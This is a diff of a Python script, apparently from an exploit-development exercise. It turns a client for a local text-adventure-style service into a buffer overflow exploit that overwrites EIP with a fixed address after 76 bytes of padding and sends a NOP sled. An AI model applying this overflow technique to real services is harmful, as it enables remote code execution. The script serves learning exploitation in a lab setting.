@@ -1,10 +1,13 @@
 import socket
+import struct
 import time
 
 s = socket.socket()
 s.connect(("localhost", 379))
 
-heapLocation = "\xC8\xF0\x62\x00"
+new_eip = struct.pack("<I", 0x0062F0DA)
+
+nop_sled = b"\x90" * 32
 
 data = s.recv(1024)
 decoded = data.decode()
@@ -18,11 +21,9 @@ while len(decoded) != 0:
         print(f">>> Sending {msg}\n")
         s.send(msg.encode())
     
-    if decoded.__contains__("pick a name"):
-        msg = "Gorak\0"
-        #msg = "A" * 2000
-        print(f">>> Sending {msg}\n")
-        s.send(msg.encode())
+    if decoded.__contains__("pick a name"):        
+        print(f">>> Sending nop_sled\n")
+        s.send(nop_sled)
 
     if decoded.__contains__("Ale, of course!"):
         msg = "1"
@@ -30,10 +31,15 @@ while len(decoded) != 0:
         s.send(msg.encode())
 
     if decoded.__contains__("shall we drink to?"):
-        #msg = "The Horde\0"
-        msg = "A" * 76 + "B" * 4 + "C" * 10
-        print(f">>> Sending {msg}\n")
-        s.send(msg.encode())
+        payload = [
+            b"A" * 76,
+            new_eip,
+            b"B" * 4,
+            b"C" * 10
+        ]
+        payload = b"".join(payload)        
+        print(f">>> Sending payload\n")
+        s.send(payload)
 
     if decoded.__contains__("shall you do now?"):
         msg = "2"
